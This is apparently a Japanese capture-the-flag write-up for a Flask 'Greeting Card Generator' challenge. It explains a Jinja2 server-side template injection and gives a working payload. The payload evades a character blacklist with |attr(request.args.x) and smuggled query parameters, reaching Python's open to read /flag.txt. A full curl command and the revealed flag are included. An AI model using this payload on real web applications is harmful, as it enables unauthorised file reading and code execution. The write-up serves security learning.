# Greeting Card Generator — Writeup

## 概要

Flask製の挨拶カードアプリで、`/card?to=...&msg=...` のGETパラメータがそのままJinja2の `render_template_string` に渡されるSSTI (Server-Side Template Injection) 脆弱性。ただし `_`, `[`, `]` の3文字がブラックリストで弾かれる。

**フラグ: `TSGCTF{Fr0m_7he_bott0m_0f_my_h34rt}`**

---

## 脆弱性分析

`app.py` の核心部分:

```python
BLOCKED = ['_', '[', ']']

@app.route("/card")
def card():
    to = request.args.get("to", "")
    msg = request.args.get("msg", "")

    for ch in BLOCKED:
        if ch in to or ch in msg:          # ← to と msg だけチェック
            return "Forbidden character detected.", 400

    template = (
        "<h1>Greeting Card</h1>"
        "<p>Dear " + to + ",</p>"
        "<p>" + msg + "</p>"
        "<p>-- Anonymous</p>"
    )
    return render_template_string(template)  # ← そのままレンダリング
```

**ポイント:** ブラックリストチェックは `to` と `msg` のみ。それ以外のクエリパラメータはチェックされない。

---

## 攻撃の考察

### Step 1: SSTIの確認

```
GET /card?msg={{7*7}}
→ <p>49</p>  ← SSTIが動作している
```

### Step 2: ブラックリスト迂回の設計

標準的なJinja2 SSTIペイロード (`__class__`, `__mro__`, `__subclasses__` など) はすべて `_` を含む。また `[` `]` によるリスト/辞書アクセスも禁止されている。

**迂回戦略:** `msg` パラメータ自体には `_`, `[`, `]` を含めず、アンダースコアを含む文字列を **別のクエリパラメータ** (`a`, `b`, `c`... など) で渡し、テンプレート内で `request.args.x` として参照する。

- Jinja2の `|attr(expr)` フィルタを使うと、文字列変数を使って属性/辞書キーにアクセスできる
- `request.args.a` はJinja2テンプレート内で `a` クエリパラメータの値を返す

### Step 3: ペイロード設計

フラグは `/flag.txt` にある (compose.yaml のボリュームマウントから判明)。

ペイロードの呼び出しチェーン:
```
lipsum.__globals__.get('__builtins__').get('open')('/flag.txt').read()
```

- `lipsum`: Jinja2組み込みグローバル関数 (Lorem Ipsumテキスト生成)
- `lipsum.__globals__`: lipsum が属する `jinja2.utils` モジュールのグローバル変数辞書
- `.get('__builtins__')`: Pythonビルトイン辞書を取得
- `.get('open')`: `open` 関数を取得
- `('/flag.txt').read()`: フラグファイルを読み込む

辞書への `[key]` アクセスが禁止されているため、`dict.get(key)` メソッドを使用。

### Step 4: テンプレート文字列の構築

`msg` パラメータ (`_`, `[`, `]` を含まない):
```
{{lipsum|attr(request.args.a)|attr(request.args.b)(request.args.c)|attr(request.args.b)(request.args.d)("/flag.txt")|attr(request.args.e)()}}
```

追加クエリパラメータ (ブラックリストチェックなし):
```
a=__globals__
b=get
c=__builtins__
d=open
e=read
```

---

## 実行

```bash
curl "http://52.192.111.216:5000/card?\
msg=%7B%7Blipsum%7Cattr%28request.args.a%29%7Cattr%28request.args.b%29%28request.args.c%29%7Cattr%28request.args.b%29%28request.args.d%29%28%22%2Fflag.txt%22%29%7Cattr%28request.args.e%29%28%29%7D%7D\
&a=__globals__&b=get&c=__builtins__&d=open&e=read"
```

**結果:**
```html
<h1>Greeting Card</h1><p>Dear ,</p><p>TSGCTF{Fr0m_7he_bott0m_0f_my_h34rt}</p><p>-- Anonymous</p>
```

---

## まとめ

| 脆弱性 | `render_template_string` へのユーザー入力の直接埋め込み |
|--------|-------------------------------------------------------|
| 迂回手法 | `|attr(request.args.x)` でブラックリスト非対象のパラメータに `__globals__` 等を隠す |
| ファイル読み込み | `lipsum.__globals__.get('__builtins__').get('open')` 経由でビルトインの `open` を呼び出す |
| フラグ | `TSGCTF{Fr0m_7he_bott0m_0f_my_h34rt}` |
